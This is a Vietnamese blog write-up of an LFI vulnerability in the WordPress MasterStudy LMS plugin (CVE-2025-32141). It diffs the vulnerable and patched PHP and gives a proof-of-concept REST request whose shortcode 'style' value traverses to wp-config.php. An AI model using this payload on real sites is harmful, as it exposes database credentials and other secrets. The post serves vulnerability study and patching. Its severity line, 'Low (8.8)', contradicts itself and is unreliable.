# CVE-2025-32141 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **MasterStudy LMS** phiên bản **≤ 3.5.28** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-32141](https://www.cve.org/CVERecord?id=CVE-2025-32141)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 3.5.28
* **Patched Versions**: 3.5.29
* **CVSS severity**: Low (8.8)
* **Required Privilege**: Contributor
* **Product**: [WordPress MasterStudy LMS Plugin](https://wordpress.org/plugins/masterstudy-lms-learning-management-system/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **MasterStudy LMS**: **3.5.28** (vulnerable) và **3.5.29** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```php {filename="stm_lms_courses_categories.php v3.5.28" hl_lines=[7,12]}
<?php
add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' );
function stm_lms_courses_categories_shortcode( $atts ) {
    $atts = shortcode_atts(
        array(
            'taxonomy' => '',
            'style'    => 'style_1',
        ),
        $atts
    );
    ob_start();
    STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] );
    return ob_get_clean();
}
```

Trong phiên bản lỗi, callback của shortcode `stm_lms_courses_categories` lấy trực tiếp giá trị `style` từ mảng `$atts` và truyền thẳng vào `STM_LMS_Templates::stm_lms_load_vc_element()` mà không có bất kỳ kiểm tra hay làm sạch đầu vào nào => LFI có thể xảy ra.

**Bản vá**:

```php {filename="stm_lms_courses_categories.php v3.5.29" hl_lines=[7,12,14]}
<?php
add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' );
function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) {
	$atts = shortcode_atts(
		array(
			'taxonomy' => '',
			'style'    => 'style_1',
		),
		$atts,
		$tag
	);
	$atts['style'] = basename( sanitize_file_name( $atts['style'] ) );
	ob_start();
	STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] );
	return ob_get_clean();
}
```

Bản vá đã sanitize `$atts['style']` bằng [`sanitize_file_name()`](https://developer.wordpress.org/reference/functions/sanitize_file_name/) đã loại bỏ chuỗi/ký tự không an toàn => ngăn chặn LFI.

### Vulnerable Code 

```php {filename="templates.php v3.5.28" hl_lines=[3,7,8]}
public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) {
    extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract
    $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path );
    if ( ! file_exists( $element ) && strpos( $__template_name, 'style_' ) !== false ) {
        $element = str_replace( $__template_name, 'style_1', $element );
    }
    if ( file_exists( $element ) ) {
        include $element;
    } else {
        echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' );
        echo esc_html( ' ' . $element );
    }
}
```

Hàm `include()` tại đây dùng biến `$element` do `stm_lms_locate_vc_element()` trả về và `$__template_name` (tức giá trị `style` từ shortcode) ảnh hưởng trực tiếp tới kết quả đó. Nếu `style` không được xác thực, attacker có thể ép `include` file tùy ý dẫn đến LFI.

```php {filename="templates.php v3.5.28" hl_lines=[3,7,8]}
public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) {
    $located = false;

    foreach ( (array) $templates as $template ) {

        $folder = $template;

        if ( ! empty( $template_name ) ) {
            $template = $template_name;
        }

        if ( substr( $template, -4 ) !== '.php' ) {
            $template .= '.php';
        }

        if ( empty( $custom_path ) ) {
            $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template );
            if ( ! ( $located ) ) {
                $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template;
            }
        } else {
            $located = locate_template( $custom_path );
            if ( ! ( $located ) ) {
                $located = STM_LMS_PATH . '/' . $custom_path . '.php';
            }
        }

        if ( file_exists( $template_name ) ) {
            break;
        }
    }

    return apply_filters( 'stm_lms_locate_vc_element', $located, $templates );
}
```

Hàm `stm_lms_locate_vc_element()` có nhiệm vụ xác định và trả về đường dẫn file template (`.php`) 

Nếu có `$template_name`, nó sẽ **ghi đè tên template mặc định** và đảm bảo tên file có phần mở rộng `.php`. Tên file sẽ là`STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php`

Ví dụ với `style=payload` thì `stm_lms_locate_vc_element()` sẽ trả về:

```py
/srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php
```

## Exploit
### Proof of Concept (PoC)

Tạo post với shortcode có attribute `style` chứa LFI payload

```http {hl_lines=[4]}
POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1
Host: localhost

{"id":260,"content":"<!-- wp:shortcode -->\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\n<!-- /wp:shortcode -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->"}
```

**Kết quả**:

Debugger đã nhảy đến `wp-config.php`

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

## Conclusion

Phiên bản **≤ 3.5.28** của MasterStudy LMS cho phép LFI qua tham số `style` trong shortcode do không kiểm tra đầu vào trước khi `include` file. Bản vá **3.5.29** đã làm sạch giá trị này bằng `sanitize_file_name()` và `basename()`, ngăn chặn việc truy cập file ngoài ý muốn.

## Key takeaways

* Không bao giờ ghép trực tiếp input người dùng vào đường dẫn file.
* Luôn sanitize hoặc giới hạn giá trị bằng whitelist trước khi `include`.
* Xác thực đường dẫn thực tế để đảm bảo file nằm trong thư mục hợp lệ.
* Cập nhật lên **v3.5.29** để loại bỏ lỗ hổng LFI.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress MasterStudy LMS Plugin <= 3.5.28 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/masterstudy-lms-learning-management-system/vulnerability/wordpress-masterstudy-lms-plugin-3-5-23-local-file-inclusion-vulnerability?_s_id=cve)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-21-cve-2025-32141/  

